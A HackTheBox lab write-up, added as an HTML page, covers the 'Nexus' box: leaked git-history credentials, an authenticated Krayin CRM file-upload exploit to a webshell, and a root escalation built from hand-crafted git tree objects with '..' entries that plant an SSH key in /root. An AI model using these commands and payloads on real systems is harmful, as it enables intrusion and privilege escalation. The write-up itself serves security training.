@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Nexus — Git Tree Path Traversal to Root</title>
+<style>
+  * { box-sizing: border-box; }
+  body {
+    background-color: #0a0e27;
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.easy {
+    background: rgba(102,217,239,0.2);
+    color: #66d9ef;
+    border-color: #66d9ef;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag-redacted {
+    color: #888;
+    font-style: italic;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Nexus — Git Tree Path Traversal to Root</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">GITEA</span>
+  <span class="tag">CVE-2026-38526</span>
+  <span class="tag">GIT PLUMBING</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Nexus is an Easy-rated Linux box, but the root path packs in a technique
+most Easy boxes never touch: crafting raw git tree objects by hand to smuggle
+a directory-traversal filename past an application's naive path handling.
+Everything before that — a leaked DB password sitting in git history, a job
+posting leaking a valid email address, and a very recent Krayin CRM file
+upload CVE — is straightforward. The privesc is where this one earns its
+keep.</p>
+
+<h2>&gt; RECON</h2>
+
+<pre>sudo nmap -sV -sC -p- --min-rate 5000 &lt;target&gt;</pre>
+
+<p>Only two ports open: 22 (SSH) and 80 (nginx, redirecting to <code>nexus.htb</code>).
+The main site is a corporate energy-company landing page. VHost fuzzing
+against the base domain turned up the real attack surface:</p>
+
+<pre>ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -H "Host: FUZZ.nexus.htb" \
+  -u http://nexus.htb/ \
+  -fs &lt;baseline_size&gt;</pre>
+
+<table>
+  <tr><th>Vhost</th><th>Service</th></tr>
+  <tr><td><code>git.nexus.htb</code></td><td>Gitea (self-hosted git), publicly browsable</td></tr>
+  <tr><td><code>billing.nexus.htb</code></td><td>Krayin CRM admin login</td></tr>
+</table>
+
+<p>The main site's careers section also leaked a real internal email address
+in its "hiring manager" contact line — <code>j.matthew@nexus.htb</code> — which
+turned out to be the exact account needed to log into the CRM later.</p>
+
+<h2>&gt; GITEA — A CREDENTIAL "REMOVED" BUT NOT PURGED</h2>
+
+<p>Gitea's <code>/explore/repos</code> page requires no authentication and listed
+a single public repository: <code>admin/krayin-docker-setup</code>. Browsing its
+file tree showed a <code>docker-compose.yml</code> and a <code>.env</code> — but the live
+<code>.env</code> had its <code>DB_PASSWORD</code> field blanked out. The repo had two
+commits, though, and Gitea serves raw commit diffs directly:</p>
+
+<pre>curl -s http://git.nexus.htb/admin/krayin-docker-setup/commit/&lt;first_commit_hash&gt;.diff</pre>
+
+<div class="callout warn">
+The first commit added the <code>.env</code> file with a real password in plain
+text. The second commit "fixed" it by blanking the field — but never
+rewrote history, so the original value was sitting untouched in the older
+commit, fully readable without any git clone or authentication at all.
+</div>
+
+<p>That leaked password (from the Docker setup repo) wasn't the one that
+mattered in the end, but it confirmed the pattern and got the login flow
+moving: paired with the <code>j.matthew@nexus.htb</code> address from the careers
+page, it worked as valid Krayin CRM admin credentials.</p>
+
+<h2>&gt; FOOTHOLD — KRAYIN CRM, CVE-2026-38526</h2>
+
+<p>Krayin CRM (Webkul's open-source Laravel CRM) v2.2.x has a critical
+authenticated arbitrary file upload vulnerability in its TinyMCE rich-text
+editor integration:</p>
+
+<ul>
+  <li><b>CVE:</b> CVE-2026-38526</li>
+  <li><b>CVSS:</b> 9.9 (Critical)</li>
+  <li><b>CWE:</b> CWE-434 — Unrestricted Upload of File with Dangerous Type</li>
+  <li><b>Endpoint:</b> <code>/admin/tinymce/upload</code></li>
+</ul>
+
+<p>The upload handler performs no server-side validation on file extension or
+content type. Anything uploaded through it lands in a web-accessible
+<code>/storage/tinymce/</code> directory, meaning a PHP webshell uploaded through the
+"image" upload dialog is directly reachable and executable via a normal
+GET request afterward.</p>
+
+<p>A public PoC automates login, upload, and verification in one shot:</p>
+
+<pre>git clone https://github.com/NathanHimself/CVE-2026-38526-PoC
+cd CVE-2026-38526-PoC
+python3 exploit.py -t http://billing.nexus.htb \
+  -u j.matthew@nexus.htb -p '&lt;redacted&gt;' -c id</pre>
+
+<p>Confirmed command execution as <code>www-data</code>. Swapping the <code>-c</code> payload for a
+one-liner reverse shell handed over an interactive session on the box.</p>
+
+<h2>&gt; PIVOT TO A REAL USER</h2>
+
+<p>The live Krayin <code>.env</code> on disk (as opposed to the sanitized one in Gitea)
+had a real, current database password:</p>
+
+<pre>find / -name ".env" 2>/dev/null | grep -i krayin
+cat /var/www/krayin/.env</pre>
+
+<p>Checking <code>/etc/passwd</code> showed exactly one account with a real login
+shell besides root — <code>jones</code>. The DB password worked directly over SSH:</p>
+
+<pre>ssh jones@nexus.htb</pre>
+
+<p>User flag secured.</p>
+
+<h2>&gt; PRIVESC — GITEA TEMPLATE SYNC PATH TRAVERSAL</h2>
+
+<p>A systemd timer runs every 60 seconds, executing a Python script as
+<b>root</b>:</p>
+
+<pre>[Unit]
+Description=Sync Gitea templates
+
+[Service]
+Type=oneshot
+User=root
+ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py</pre>
+
+<p>Reading the script revealed its logic: it authenticates to the local Gitea
+API, finds any repositories flagged as <b>template repositories</b>, walks each
+one's git tree with <code>git ls-tree -r HEAD</code>, and writes every entry out to a
+staging directory:</p>
+
+<pre>for mode, objhash, filepath in entries:
+    target = os.path.join(stage_path, filepath)
+    ...
+    with open(target, 'wb') as f:
+        f.write(cat_result.stdout)</pre>
+
+<div class="callout warn">
+<code>filepath</code> comes straight from the tree entries recorded inside the
+repository — and while a normal <code>git add ../../etc/passwd</code> is blocked by
+git's working-tree safeguards, that protection lives in the porcelain
+commands, not in the underlying object model. Git's low-level plumbing
+(<code>git hash-object</code>, <code>git mktree</code>, <code>git commit-tree</code>) will happily build a
+tree object containing an entry literally named <code>..</code> — and nested trees of
+those, walked recursively by <code>ls-tree -r</code>, reconstruct a full traversal path
+one directory-hop at a time. <code>os.path.join</code> in the script does zero
+sanitization, so once the OS resolves those <code>..</code> components, the write lands
+wherever the attacker pointed it — including outside the staging directory
+entirely.
+</div>
+
+<p><b>Building the payload.</b> A single <code>mktree</code> entry containing a path with
+slashes is rejected outright (<code>fatal: path ... contains slash</code>) — git's
+plumbing still enforces that a tree entry is a single path component. The
+way around it is building the tree structure by hand, one directory level
+at a time, bottom-up:</p>
+
+<pre># 1. Blob = attacker's SSH public key
+BLOB_HASH=$(cat ~/.ssh/nexus_root.pub | git hash-object -w --stdin)
+
+# 2. Tree: { authorized_keys -> blob }
+TREE_KEYS=$(printf "100644 blob %s\tauthorized_keys\n" "$BLOB_HASH" | git mktree)
+
+# 3. Tree: { .ssh -> TREE_KEYS }
+TREE_SSH=$(printf "040000 tree %s\t.ssh\n" "$TREE_KEYS" | git mktree)
+
+# 4. Tree: { root -> TREE_SSH }
+TREE_ROOT=$(printf "040000 tree %s\troot\n" "$TREE_SSH" | git mktree)
+
+# 5. Wrap in ".." trees, one level per mktree call, enough to
+#    walk back past the staging directory's full depth
+CURRENT=$TREE_ROOT
+for i in 1 2 3 4 5 6; do
+  CURRENT=$(printf "040000 tree %s\t..\n" "$CURRENT" | git mktree)
+done
+
+# 6. Commit the resulting tree and force-push it as the branch head
+COMMIT_HASH=$(git commit-tree $CURRENT -m "traversal payload")
+git update-ref refs/heads/main $COMMIT_HASH
+git push origin main --force</pre>
+
+<div class="callout">
+Extra <code>..</code> levels beyond what's strictly needed are harmless — POSIX
+path resolution treats <code>..</code> at the filesystem root as a no-op rather than
+an error, so it's safe to overshoot the exact depth rather than count it
+precisely.
+</div>
+
+<p>The final piece: the sync script only processes repositories flagged as
+<b>template repositories</b> in Gitea — a setting entirely separate from repo
+creation, tucked into the repo's own Settings page (<i>"Make repository a
+template"</i>). Easy to miss on a first pass; the sync log kept reporting
+<code>Found 0 template repo(s)</code> until that checkbox was actually saved.</p>
+
+<p>Once flagged, the next timer cycle (within 60 seconds) picked up the repo,
+walked the crafted tree, and wrote the attacker's public key straight into
+<code>/root/.ssh/authorized_keys</code>:</p>
+
+<pre>ssh -i ~/.ssh/nexus_root root@nexus.htb</pre>
+
+<pre>root@nexus:~# cat /root/root.txt
+<span class="flag-redacted">[root flag captured ✅]</span></pre>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+
+<ol>
+  <li>Publicly browsable Gitea repo's commit history leaks a database password that was "removed" in a later commit but never purged from history</li>
+  <li>Company careers page leaks a real internal employee email address</li>
+  <li>Email + leaked password combination logs into Krayin CRM as admin</li>
+  <li>Authenticated arbitrary file upload (CVE-2026-38526) via TinyMCE's upload endpoint → PHP webshell → <code>www-data</code></li>
+  <li>Live app config on disk leaks a second, real database password</li>
+  <li>Password reuse gets SSH access as the box's only real-shell user</li>
+  <li>Root-run systemd timer syncs any Gitea repo flagged as a "template," writing tree entries to disk with zero path sanitization</li>
+  <li>Hand-crafted nested git tree objects (using literal <code>..</code> path components via low-level plumbing, not <code>git add</code>) escape the staging directory</li>
+  <li>Payload writes an attacker SSH key directly into <code>/root/.ssh/authorized_keys</code> → root</li>
+</ol>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<ul>
+  <li>"Removing" a secret in a later commit does nothing for security unless history is actually rewritten (<code>git filter-repo</code>, BFG, or a fresh repo). Anyone can read the diff of any commit, not just the current HEAD.</li>
+  <li>Job postings, "meet the team" pages, and hiring-manager contact blurbs are a legitimate username/email enumeration source — treat public marketing copy as part of the attack surface.</li>
+  <li>Path sanitization has to happen at every layer that touches user-influenced data — a system can correctly block traversal at the git porcelain level (<code>git add</code>) while its plumbing commands and any script consuming that data downstream remain completely exposed.</li>
+  <li><code>os.path.join()</code> (and equivalents in most languages) is a string-concatenation helper, not a security boundary — it does not resolve or reject <code>..</code> components. Sanitize with realpath/normalization and an explicit prefix check before ever writing to disk.</li>
+  <li>Any "sync," "import," or "template" feature that pulls attacker-influenced file paths and writes them with elevated privileges is worth a very close look, especially when it runs unattended on a timer as root.</li>
+</ul>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+</body>
+</html>
